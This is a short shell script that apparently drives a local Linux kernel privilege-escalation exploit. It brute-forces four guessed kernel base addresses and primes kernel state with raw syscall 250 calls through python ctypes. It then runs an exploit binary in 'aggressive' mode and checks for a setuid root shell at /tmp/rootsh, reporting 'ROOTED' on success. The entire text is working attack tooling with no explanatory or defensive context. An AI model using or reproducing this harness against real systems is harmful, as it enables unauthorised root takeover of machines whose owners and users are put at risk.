#!/bin/sh
cd /tmp/rt || exit 1
for kb in 0xffffffffad800000 0xffffffffade00000 0xffffffffadc00000 0xffffffffae000000; do
  echo "=== try kbase=$kb ==="
  for i in 1 2 3 4 5 6; do
    python3 -c "import ctypes;l=ctypes.CDLL(None);[l.syscall(250,7,ctypes.c_ulong(r)) for r in (-2,-3,-4,-5)]" 2>/dev/null
    BBH_KBASE=$kb timeout 60 ./e_def --aggressive --quiet >/dev/null 2>&1
    if [ -u /tmp/rootsh ]; then echo "ROOTED kbase=$kb attempt $i"; ls -la /tmp/rootsh; exit 0; fi
  done
  echo "  (no root)"
done
echo "DONE_NO_ROOT"
